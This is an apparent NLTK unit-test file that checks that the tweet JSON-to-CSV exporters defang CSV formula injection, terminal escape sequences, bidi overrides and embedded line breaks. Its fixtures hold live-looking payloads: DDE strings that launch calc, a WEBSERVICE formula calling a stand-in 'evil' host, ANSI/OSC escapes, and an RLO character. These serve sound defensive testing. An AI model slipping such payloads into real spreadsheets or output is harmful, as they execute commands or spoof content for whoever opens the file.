# Natural Language Toolkit: CSV-injection guard tests
#
# Copyright (C) 2001-2026 NLTK Project
# URL: <https://www.nltk.org/>
# For license information, see LICENSE.TXT

"""nltk exports untrusted tweet data to CSV (nltk.twitter.common.json2csv /
json2csv_entities). A CSV cell that begins with = + - @ is run as a formula when
the file is opened in a spreadsheet (CWE-1236), and an embedded control sequence
or bidi override fires when it is displayed (CWE-150, Trojan Source). Every cell
is routed through nltk.csvsec.sanitize_csv_field. These tests drive the real
writers end to end on a real file and read the result back through csv.reader
(no mocks); the hostile tweet JSON is the only fixture, which is exactly the
untrusted input. The live-control oracle is the one test_termsec_attack_matrix.py
derives independently of nltk.termsec, so a sanitiser regression cannot hide
behind its own detector; the sanitize_terminal and sanitize_csv_field unit
matrices live in that module."""

import csv
import json
import os

from nltk.test.unit.test_termsec_attack_matrix import _has_live_control

ESC = chr(0x1B)
BEL = chr(0x07)
CR = chr(0x0D)
RLO = chr(0x202E)  # right-to-left override (Trojan Source, CVE-2021-42574)
FORMULA_LEADS = ("=", "+", "-", "@")


def _write_tweets(tmp_path, tweets):
    infile = os.path.join(tmp_path, "tweets.json")
    with open(infile, "w", encoding="utf-8") as fh:
        for t in tweets:
            fh.write(json.dumps(t) + "\n")
    return infile


def _raw(outfile):
    # newline="" keeps the writer's own CR LF record terminators visible
    with open(outfile, encoding="utf-8", newline="") as fh:
        return fh.read()


def _rows(outfile):
    with open(outfile, encoding="utf-8", newline="") as fh:
        return list(csv.reader(fh))


def _isnum(s):
    try:
        float(s)
        return True
    except ValueError:
        return False


def _assert_no_formula_lead(rows):
    # no cell anywhere, header included, still leads with a formula character
    for row in rows:
        for cell in row:
            assert cell[:1] not in FORMULA_LEADS or _isnum(cell), cell


def _assert_no_live_control(raw):
    # the record terminator is the only CR LF the writer may leave in the file;
    # anything else the independent detector flags (C0/C1, DEL, bidi, format
    # characters, surrogates) survived the sanitiser
    assert not _has_live_control(raw.replace(CR + "\n", "\n")), ascii(raw)


def test_json2csv_neutralises_formula_injection(tmp_path):
    from nltk.twitter.common import json2csv

    tweets = [
        {"id": 1, "text": '=cmd|"/c calc"!A1'},
        {"id": 2, "text": "@SUM(1+1)*cmd"},
        {"id": 3, "text": "=cmd|'/c calc'!A1"},
        {"id": 4, "text": "+cmd"},
        {"id": 5, "text": "a normal tweet"},
        {"id": 6, "text": "-42"},
    ]
    infile = _write_tweets(str(tmp_path), tweets)
    outfile = os.path.join(str(tmp_path), "out.csv")
    with open(infile, encoding="utf-8") as fp:
        json2csv(fp, outfile, ["id", "text"])

    rows = _rows(outfile)
    assert rows[0] == ["id", "text"]
    texts = [r[1] for r in rows[1:]]
    # the apostrophe is the only thing prepended, and only to a formula lead
    assert texts[0] == "'" + '=cmd|"/c calc"!A1'
    assert texts[1] == "'@SUM(1+1)*cmd"
    assert texts[2] == "'=cmd|'/c calc'!A1"
    assert texts[3] == "'+cmd"
    assert texts[4] == "a normal tweet"
    assert texts[5] == "-42"  # a genuine negative number is not corrupted
    _assert_no_formula_lead(rows)
    _assert_no_live_control(_raw(outfile))


def test_json2csv_neutralises_control_sequences_and_bidi_overrides(tmp_path):
    from nltk.twitter.common import json2csv

    tweets = [
        {"id": 1, "text": ESC + "[31mhack" + ESC + "[0m" + BEL},
        {"id": 2, "text": ESC + "[31m" + RLO + "spoof"},
        {"id": 3, "text": "line1" + CR + "SPOOF"},
        {"id": 4, "text": "injected" + CR + "\n" + "9,row"},
    ]
    infile = _write_tweets(str(tmp_path), tweets)
    outfile = os.path.join(str(tmp_path), "out.csv")
    with open(infile, encoding="utf-8") as fp:
        json2csv(fp, outfile, ["id", "text"])

    raw = _raw(outfile)
    assert ESC not in raw and BEL not in raw and RLO not in raw
    _assert_no_live_control(raw)
    rows = _rows(outfile)
    # one record per tweet: a CR or CR LF inside a cell injected no row
    assert [r[0] for r in rows] == ["id", "1", "2", "3", "4"]
    assert all(len(r) == 2 for r in rows)
    assert "spoof" in rows[2][1] and "SPOOF" in rows[3][1]
    _assert_no_formula_lead(rows)


def test_json2csv_entities_are_sanitised(tmp_path):
    from nltk.twitter.common import json2csv_entities

    tweets = [
        {
            "id": 7,
            "text": "hi",
            "user": {"name": '=WEBSERVICE("http://evil")'},
            "hashtags": [{"text": "=danger"}, {"text": ESC + "]0;pwned" + BEL}],
        }
    ]
    infile = _write_tweets(str(tmp_path), tweets)
    outfile = os.path.join(str(tmp_path), "ent.csv")
    with open(infile, encoding="utf-8") as fp:
        json2csv_entities(
            fp,
            outfile,
            ["id", "text"],
            "hashtags",
            ["text"],
        )
    rows = _rows(outfile)
    assert len(rows) == 3 and rows[1][-1] == "'=danger"
    _assert_no_formula_lead(rows)
    raw = _raw(outfile)
    assert ESC not in raw and BEL not in raw
    _assert_no_live_control(raw)
